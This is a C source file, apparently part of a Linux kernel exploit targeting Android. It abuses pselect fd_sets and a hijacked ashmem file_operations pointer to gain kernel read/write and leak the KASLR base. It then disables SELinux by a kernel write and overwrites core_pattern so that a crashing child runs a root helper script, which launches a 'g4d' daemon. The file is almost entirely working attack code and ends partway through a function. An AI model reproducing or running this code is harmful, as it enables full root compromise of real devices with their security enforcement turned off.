#include "common.h"
#include "runtime_struct_offsets.h"
#include <time.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  int default_delay = pselect_custom_write_enabled() ? 0 : -1;
  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
                               default_delay, -1, 1000000);
  if (override >= 0) {
    return override;
  }

  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int shift = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
  int global_word = shift + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  if (env_flag("PSELECT_SIMPLE_LAYOUT", 0)) {
    fdset_put_word(in, 0, fake_w0);
    fdset_put_word(in, 3, 0);
    fdset_put_word(ex, 0,
                   pselect_custom_write_enabled() ? fake_task :
                   text_addr(INIT_TASK));
    fdset_put_word(ex, 1, fake_lock);
    fdset_put_word(ex, 2, 3);
    fdset_put_word(ex, 3, 0);
    return;
  }

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  }
#ifdef TARGET_A15
  /* 5.15 rt_mutex_waiter (88 bytes): tree_entry@0x00, pi_tree_entry@0x18,
   * task@0x30, lock@0x38, wake_state@0x40+prio@0x44, deadline@0x48,
   * ww_ctx@0x50. No pi_prio/pi_deadline fields. */
  words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 0, "pi_parent"},
    {6, 0, "pi_right"},
    {7, 0, "pi_left"},
    {8, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {9, fake_lock, "lock"},
    {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_state|prio"},
    {11, 0, "deadline"},
    {12, 0, "ww_ctx"},
  };
#else
  words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };
#endif
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d simple=%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            route_attempt,
            env_flag("PSELECT_SIMPLE_LAYOUT", 0),
            env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);

    struct timeval timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_usec = PSELECT_TIMEOUT_USEC,
#else
      .tv_usec = 0,
#endif
    };

    pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
    /* A17: GL_PRESEED_SELECT — warm the select path once with the prepared
     * fd_sets before arming the consumer (punch_consume_go moves after it,
     * so the preseed round never triggers the punch). */
    if (env_flag("GL_PRESEED_SELECT", 0)) {
      fd_set pin = in;
      fd_set pout = out;
      fd_set pex = ex;
      struct timeval zero = {0, 0};
      select(PSELECT_ROUTE_NFDS, &pin, &pout, &pex, &zero);
    }
    atomic_store(&punch_consume_go, route_attempt);
    errno = 0;
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    int saved_errno = errno;
    pr_info("pselect post-select +%.0fms ret=%d\n", fops_elapsed_ms(&route_t0), ret);
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
        if (active_offsets && active_offsets->off_system_unbound_wq &&
            !root_child_done) {
          try_cfi_stage();
        }
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_quality_miss) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  uint64_t restore_value = 0;
  uint64_t restored_value = 0;
  ssize_t restore_ret = -1;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  if (configfs_read_once(fd, boot_id_data, &slide_bootid_before,
                         sizeof(slide_bootid_before)) !=
      (ssize_t)sizeof(slide_bootid_before))
    return 0;
  restore_value = slide_bootid_before;
  const char *restore_env = getenv("A15_BOOTID_RESTORE_WORD");
  if (restore_env && *restore_env)
    restore_value = strtoull(restore_env, NULL, 0);
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  ssize_t verify_ret = configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  int write_verified =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      verify_ret == (ssize_t)sizeof(slide_bootid_after) &&
      slide_bootid_after == slide_bootid_want;
  if (write_verified) {
    restore_ret = configfs_write_once(fd, boot_id_data, &restore_value,
                                      sizeof(restore_value));
    if (restore_ret == (ssize_t)sizeof(restore_value))
      configfs_read_once(fd, boot_id_data, &restored_value,
                         sizeof(restored_value));
  }
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx preserve=%016llx "
          "preserve_ret=%zd restored=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after,
          (unsigned long long)restore_value, restore_ret,
          (unsigned long long)restored_value, errno);
  return write_verified && restore_ret == (ssize_t)sizeof(restore_value) &&
         restored_value == restore_value;
}

static int corepat_set_enforcing(int fd, unsigned char value) {
  uintptr_t target = data_addr(SELINUX_ENFORCING);
  unsigned char after = 0xff;
  ssize_t wr = kernel_write_data(fd, target, &value, sizeof(value));
  ssize_t rd = kernel_read_data(fd, target, &after, sizeof(after));
  pr_info("corepat: SELinux write ret=%zd read=%zd value=%u after=%u "
          "target=%016zx errno=%d\n",
          wr, rd, value, after, target, errno);
  return wr == (ssize_t)sizeof(value) && rd == (ssize_t)sizeof(after) &&
         after == value;
}

static int corepat_restore_enforcing(int fd, unsigned char original) {
  for (int i = 0; i < 5; i++) {
    if (corepat_set_enforcing(fd, original))
      return 1;
    usleep(100000);
  }
  return 0;
}

/* A15_CONFIGFS_COREPAT_ROOT is a direct-configfs alternative to the pipe
 * physrw root stage. Android's enforcing kernel domain cannot execute or
 * read the helper under shell_data_file, so first disable SELinux through
 * the verified configfs write channel. Then install the core handler,
 * trigger a disposable child, and restore core_pattern. Keep SELinux
 * permissive only after the root marker is confirmed; restore it on failure. */
static int configfs_corepat_root(int fd, uintptr_t misc_fops) {
  static const char corepat[] = "|/data/local/tmp/a/r.sh";
  static const char helper[] =
      "#!/system/bin/sh\n"
      "/system/bin/id -u > /data/local/tmp/a/.rr_rooted 2>&1\n"
      "/data/local/tmp/a/g4d > /data/local/tmp/a/g4d-root.log "
      "2>&1 </dev/null &\n";
  const size_t n = sizeof(corepat);
  uintptr_t target = data_addr(CORE_PATTERN);
  unsigned char before[sizeof(corepat)];
  unsigned char after[sizeof(corepat)];
  unsigned char restored[sizeof(corepat)];
  uintptr_t enforcing_target = data_addr(SELINUX_ENFORCING);
  unsigned char enforcing_before = 0xff;

  if (fd < 0 || !is_direct_ptr(target) ||
      access("/data/local/tmp/a/g4d", X_OK) != 0 ||
      kernel_read_data(fd, target, before, n) != (ssize_t)n ||
      kernel_read_data(fd, enforcing_target, &enforcing_before,
                       sizeof(enforcing_before)) !=
          (ssize_t)sizeof(enforcing_before) || enforcing_before > 1) {
    pr_warning("corepat: preflight failed target=%016zx errno=%d\n",
               target, errno);
    return 0;
  }

  if (mkdir("/data/local/tmp/a", 0755) != 0 && errno != EEXIST) {
    pr_warning("corepat: helper directory create failed errno=%d\n", errno);
    return 0;
  }
  int hfd = open("/data/local/tmp/a/r.sh",
                 O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (hfd < 0) {
    pr_warning("corepat: helper create failed errno=%d\n", errno);
    return 0;
  }
  ssize_t hwr = write(hfd, helper, sizeof(helper) - 1);
  int herrno = errno;
  int hmode = fchmod(hfd, 0755);
  close(hfd);
  if (hwr != (ssize_t)(sizeof(helper) - 1) || hmode != 0) {
    pr_warning("corepat: helper write failed ret=%zd mode=%d errno=%d\n",
               hwr, hmode, herrno);
    return 0;
  }

  if (enforcing_before && !corepat_set_enforcing(fd, 0)) {
    if (!corepat_restore_enforcing(fd, enforcing_before)) {
      pr_error("corepat: could not restore SELinux after failed disable; "
               "holding channel open\n");
      for (;;) pause();
    }
    return 0;
  }

  unlink("/data/local/tmp/a/.rr_rooted");
  errno = 0;
  ssize_t wr = kernel_write_data(fd, target, corepat, n);
  int werrno = errno;
  ssize_t rd = kernel_read_data(fd, target, after, n);
  int pattern_ok = wr == (ssize_t)n && rd == (ssize_t)n &&
                   memcmp(after, corepat, n) == 0;
  pr_info("corepat: write ret=%zd read=%zd match=%d target=%016zx errno=%d\n",
          wr, rd, pattern_ok, target, werrno);
  if (!pattern_ok) {
    /* Restore even if the write reported an error: a short copy may have
     * changed a prefix of the global buffer. */
    int restore_ok = 0;
    for (int i = 0; i < 5; i++) {
      ssize_t rw = kernel_write_data(fd, target, before, n);
      ssize_t rr = kernel_read_data(fd, target, restored, n);
      if (rw == (ssize_t)n && rr == (ssize_t)n &&
          memcmp(restored, before, n) == 0) {
        restore_ok = 1;
        break;
      }
      usleep(100000);
    }
    if (!restore_ok) {
      pr_error("corepat: failed to restore after write mismatch; holding channel\n");
      for (;;) pause();
    }
    if (!corepat_restore_enforcing(fd, enforcing_before)) {
      pr_error("corepat: failed to restore SELinux after pattern mismatch; "
               "holding channel open\n");
      for (;;) pause();
    }
    return 0;
  }

  pid_t child = fork();
  if (child == 0) {
    struct rlimit rl = { RLIM_INFINITY, RLIM_INFINITY };
    setrlimit(RLIMIT_CORE, &rl);
    prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
    signal(SIGSEGV, SIG_DFL);
    raise(SIGSEGV);
    _exit(1);
  }
  int status = 0;
  int waited = child > 0 && waitpid(child, &status, 0) == child;
  int rooted = 0;
  for (int i = 0; i < 50; i++) {
    int mfd = open("/data/local/tmp/a/.rr_rooted", O_RDONLY | O_CLOEXEC);
    if (mfd >= 0) {
      char uid[16] = {0};
      ssize_t nr = read(mfd, uid, sizeof(uid) - 1);
      close(mfd);
      rooted = nr > 0 && uid[0] == '0' &&
               (uid[1] == '\n' || uid[1] == '\0');
      if (rooted)
        break;
    }
    usleep(100000);
  }
  if (rooted)
    usleep(750000);  /* let the daemon bind after its marker is written */
  pr_info("corepat: child=%d waited=%d status=%x root-marker=%d\n",
          child, waited, status, rooted);

  int restore_ok = 0;
  for (int i = 0; i < 5; i++) {
    ssize_t rw = kernel_write_data(fd, target, before, n);
    ssize_t rr = kernel_read_data(fd, target, restored, n);
    if (rw == (ssize_t)n && rr == (ssize_t)n &&
        memcmp(restored, before, n) == 0) {
      restore_ok = 1;
      break;
    }
    usleep(100000);
  }
  pr_info("corepat: restore=%d target=%016zx\n", restore_ok, target);
  if (!restore_ok) {
    pr_error("corepat: could not restore core_pattern; holding channel open\n");
    for (;;) pause();
  }
  if (!rooted) {
    if (!corepat_restore_enforcing(fd, enforcing_before)) {
      pr_error("corepat: root marker absent and SELinux restore failed; "
               "holding channel open\n");
      for (;;) pause();
    }
    return 0;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t fr = kernel_write_data(fd, misc_fops, &original_fops,
                                 sizeof(original_fops));
  uint64_t fops_check = 0;
  ssize_t frr = kernel_read_data(fd, misc_fops, &fops_check,
                                 sizeof(fops_check));
  cfi_restore_ret = fr;
  cfi_last_step = 12;
  if (fr != (ssize_t)sizeof(original_fops) ||
      frr != (ssize_t)sizeof(fops_check) || fops_check != original_fops) {
    pr_error("corepat: root reached but ashmem fops restore failed; holding channel\n");
    for (;;) pause();
  }
  fops_after = fops_check;
  uint64_t null_owner = 0;
  kernel_write_data(fd, fake_fops, &null_owner, sizeof(null_owner));
  close(fd);
  pr_success("ROOTED via configfs core_pattern; SELinux remains permissive; "
             "g4d should provide uid 0\n");
  exit(0);
}

int install_child_root(int fd) {
  if (!install_pipe_physrw(fd)) return 0;
  if (install_umh_root(fd)) return 1;
  return install_android_root(fd);
}

static int cfi_probe_owned_page_channel(void) {
  char payload[] = "CFI_CHANNEL_CANARY";
  int write_fd = open_ashmem_device();
  if (write_fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_warning("cfi canary open for write failed errno=%d\n", errno);
    return 0;
  }

  errno = 0;
  ssize_t wr = configfs_write_once(
      write_fd, binwrite_target, payload, sizeof(payload));
  int write_errno = errno;
  pr_info("cfi channel canary write ret=%zd errno=%d target=%016zx\n",
          wr, write_errno, binwrite_target);
  close(write_fd);
  if (wr != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = write_errno;
    return 0;
  }

  char readback[sizeof(payload)] = {0};
  int read_fd = open_ashmem_device();
  if (read_fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_warning("cfi canary open for read failed errno=%d\n", errno);
    return 0;
  }
  errno = 0;
  ssize_t rd = configfs_read_once(
      read_fd, binwrite_target, readback, sizeof(readback));
  int read_errno = errno;
  pr_info("cfi channel canary read ret=%zd errno=%d match=%d\n",
          rd, read_errno,
          rd == (ssize_t)sizeof(readback) &&
              memcmp(readback, payload, sizeof(payload)) == 0);
  close(read_fd);
  if (rd != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = read_errno;
    return 0;
  }

  pr_success("cfi owned-page channel canary verified\n");
  return 1;
}

int try_cfi_stage(void) {
  cfi_attempts++;
  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t observed_fops = 0;
  fops_before = 0;
  fops_after = 0;

  /* Verify the global handoff before attempting the first write. Read through
   * a separate fd because configfs_read_iter marks that file read-only for
   * its lifetime. */
  int probe_fd = open_ashmem_device();
  if (probe_fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi fops probe open failed path=%s errno=%d\n",
            ashmem_path, errno);
    return 0;
  }
  errno = 0;
  ssize_t probe_ret = configfs_read_once(
      probe_fd, misc_fops, &observed_fops, sizeof(observed_fops));
  int probe_errno = errno;
  pr_info("cfi fops probe ret=%zd value=%016llx want=%016zx errno=%d\n",
          probe_ret, (unsigned long long)observed_fops, fake_fops,
          probe_errno);
  if (probe_ret == (ssize_t)sizeof(observed_fops)) {
    fops_before = observed_fops;
    if (observed_fops == canon_addr(ASHMEM_FOPS)) {
      close(probe_fd);
      fops_after = observed_fops;
      cfi_last_step = 12;
      cfi_last_errno = 0;
      pr_info("cfi fops pointer remains original; skipping write\n");
      return 0;
    }
  }
  close(probe_fd);

  /* configfs_read_once on a stock ashmem fd can return bytes from its backing
   * area, so a short/other value is not proof that the fops handoff failed.
   * Test the channel by writing and reading a canary in our own payload page.
   * This address is owned by the retained skb pages, not a system object. */
  if (probe_ret != (ssize_t)sizeof(observed_fops) ||
      observed_fops != fake_fops) {
    pr_warning("cfi fops pointer readback is inconclusive; probing owned-page channel\n");
    if (!cfi_probe_owned_page_channel())
      return 0;
  }

  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx write_iter=%016llx\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)text_addr(ASHMEM_IOCTL),
          (unsigned long long)text_addr(ASHMEM_OPEN),
          (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  /* This route uses the already-verified configfs write channel against the
   * static core_pattern buffer, so it can reach a root helper without first
   * winning the separate pipe-buffer reclaim stage. */
  if (env_flag("A15_CONFIGFS_COREPAT_ROOT", 0)) {
    if (configfs_corepat_root(fd, misc_fops))
      return 1;  /* success exits after restoring core_pattern and fops */
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  /* One-shot diagnostic: test whether the separate KernelSnitch reclaim
   * can place owned pipe_buffer arrays in its leaked kmalloc-2k page and
   * whether the armed configfs channel can read those objects. The helper
   * validates the slab cache first and tears down its keeper child. */
  if (getenv("A15_PIPE_RECLAIM_CHANNEL_DIAG")) {
    pr_info("cfi: running reclaimed pipe-buffer channel diagnostic\n");
    pipe_reclaim_channel_diag(fd);
    cfi_last_step = 8;
    cfi_last_errno = 0;
    goto fail;
  }

  /* Validate the reclaimed-pipe path without entering UMH/root code. This
   * opt-in gate writes and restores one boot-id word, then disarms the pipe
   * array before the CFI probe is unwound. */
